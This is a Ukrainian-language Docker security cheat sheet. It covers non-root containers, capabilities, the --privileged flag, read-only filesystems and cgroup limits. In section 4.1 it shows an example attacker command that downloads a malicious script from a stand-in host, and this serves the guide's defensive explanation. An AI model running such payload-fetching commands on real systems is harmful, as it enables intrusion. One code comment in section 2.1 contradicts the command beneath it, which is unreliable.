## 1. THE ROOT PROBLEM: CONTAINER ESCAPE 🟥 MUST KNOW

### 1.1. WHAT & WHY

Головне правило безпеки Docker: **Контейнери не є повноцінними віртуальними машинами (VM).** Вони ділять одне ядро (Linux Kernel) із хост-системою.

  

- _Default Behavior:_ Процес всередині контейнера за замовчуванням запускається від імені користувача `root` (UID 0).
    
      
    
- _The Danger:_ Уяви, що ти запустив веб-додаток на Node.js від `root`. Хакер знайшов вразливість у коді (наприклад, Remote Code Execution) і отримав доступ до термінала контейнера. Оскільки він `root` всередині, він може спробувати використати вразливість ядра Linux (Container Escape Exploit), щоб вирватися з ізоляції і стати `root` на твоєму фізичному сервері.
    
      
    

### 1.2. The Golden Rule of Container Security

**Ніколи не запускай процеси в контейнері від імені `root`, якщо цього не вимагає сама суть програми.** (Наприклад, Nginx потрібен `root` на мілісекунду, щоб відкрити порт 80, але твій код на Python/Java має працювати як звичайний користувач).

  

## 2. NON-ROOT CONTAINERS (Інструкція `USER`) 🟥 MUST KNOW

Це найефективніший і найпростіший спосіб захистити контейнер. Ти створюєш звичайного користувача з обмеженими правами (Unprivileged user) і перемикаєш процес на нього.

  

### 2.1. The Best Practice (Dockerfile)

🔴 _Anti-pattern:_

  

Dockerfile

```
FROM python:3.10
WORKDIR /app
COPY . .
CMD ["python", "app.py"] # Запуститься як root (UID 0)
```

🟢 _Production Standard:_

  

Dockerfile

```
FROM python:3.10
WORKDIR /app
COPY . .

# 1. Створюємо системного користувача (без пароля і домашньої папки)
RUN useradd --create-home --shell /bin/bash appuser
# 2. Віддаємо йому права на папку з кодом
RUN chown -R appuser:appuser /app
# 3. Перемикаємо контекст! Усі наступні команди будуть від appuser
USER appuser

CMD ["python", "app.py"] # Запуститься як appuser (UID 1000+)
```

- _Verification:_ Запусти `docker exec -it <container> id`. Ти маєш побачити `uid=1000(appuser)`, а не `0(root)`.
    
      
    

## 3. LINUX CAPABILITIES & THE `--privileged` FLAG 🟥 MUST KNOW

### 3.1. What are Capabilities?

Історично в Linux був лише `root` (може все) і звичайний користувач (майже нічого не може).

Пізніше ядро Linux розділило суперсилу `root` на ~40 окремих **Capabilities** (можливостей).

  

- Наприклад: `CAP_NET_BIND_SERVICE` — дозволяє відкривати порти до 1024 (порт 80, 443).
    
      
    
- `CAP_SYS_TIME` — дозволяє змінювати системний час.
    
      
    
- `CAP_CHOWN` — дозволяє змінювати власника файлів.
    
      
    
- _Default Docker Behavior:_ Docker розумний. Навіть якщо твій контейнер працює від `root`, Docker забирає (drops) у нього більшість небезпечних Capabilities. Саме тому ти не можеш змінити час або завантажити свій модуль ядра зсередини контейнера.
    
      
    

### 3.2. Прапорець `--privileged` 🔴 CRITICAL DANGER

Цей прапорець вимикає **ВСІ** механізми захисту Docker (Capabilities, Seccomp, AppArmor, cgroups isolation).

Контейнер отримує повний, прямий доступ до всіх пристроїв хоста (`/dev`) і може робити з ядром сервера все, що завгодно.

  

- _When to use:_ **Ніколи**, окрім випадків, коли ти запускаєш Docker-in-Docker (DinD) для CI-раннерів або низькорівневі системні агенти (наприклад, VPN-клієнти).
    
      
    
- _Security Fact:_ Віддати хакеру доступ до `--privileged` контейнера — це те саме, що дати йому пароль від `root` твого сервера.
    
      
    

### 3.3. Fine-grained Control (Додавання/Видалення Capabilities) 🟪 ADVANCED

Замість того, щоб давати контейнеру режим "Бога" (`--privileged`), додавай лише те, що йому дійсно потрібно (Principle of Least Privilege).

  

YAML

```
# Приклад docker-compose.yml для застосунку, який дуже параноїдально налаштований
services:
  secure-app:
    image: my-app:v1
    cap_drop:
      - ALL       # Забрати абсолютно всі права (навіть стандартні)
    cap_add:
      - NET_ADMIN # Додати тільки право керувати мережею
```

## 4. READ-ONLY FILESYSTEM & RESOURCE LIMITS 🟨 SHOULD KNOW

### 4.1. The `--read-only` Flag

Якщо хакер потрапив у контейнер, перше, що він робить — викачує свій шкідливий скрипт (`wget [http://hacker.com/malware.sh](http://hacker.com/malware.sh)`).

  

- _Defense:_ Ти можеш заборонити будь-який запис у файлову систему контейнера.
    
      
    
- _CLI:_ `docker run --read-only my-app`
    
      
    
- _Trade-off:_ Якщо твоїй програмі треба писати логи або тимчасові файли, вона впаде з помилкою `Read-only file system`. Рішення: примонтувати `tmpfs` у папки логів (напр. `/tmp`).
    
      
    

### 4.2. Cgroups Resource Limiting (Захист від DDoS та витоку пам'яті)

- _The Problem:_ Один контейнер з витоком пам'яті (Memory Leak) може з'їсти всі 100% RAM сервера. Тоді ядро Linux увімкне **OOM Killer** (Out Of Memory Killer) і почне випадково вбивати інші важливі процеси (наприклад, базу даних).
    
      
    
- _The Solution:_ Завжди обмежуй ресурси (через cgroups) у production.
    
      
    

**CLI Syntax:**

  

Bash

```
docker run --memory="512m" --cpus="0.5" nginx
```

**Docker Compose Syntax (Best Practice):**

  

YAML

```
services:
  app:
    image: my-app:v1
    deploy:
      resources:
        limits:
          cpus: '0.50'     # Максимум пів-ядра
          memory: 512M     # Максимум 512 Мегабайт
        reservations:
          memory: 128M     # Гарантований мінімум
```

## 5. MEMORY CORE & SECURITY CHECKLIST

**Що я повинен пам'ятати (Production Security Minimum):**

  

1. **Rule 1:** Збираєш свій образ? Завжди додавай інструкцію `USER` наприкінці Dockerfile.
    
      
    
2. **Rule 2:** Хтось просить запустити контейнер з `--privileged`? Ти маєш відмовити, пояснити ризики і запропонувати `--cap-add`.
    
      
    
3. **Rule 3:** Завжди встановлюй CPU/RAM `limits` для контейнерів, щоб один багований сервіс не поклав увесь сервер (OOM).
    
      
    
4. **Rule 4:** Якщо є змога, запускай контейнери з `read_only: true` (у Compose), а для логів використовуй `tmpfs`.
    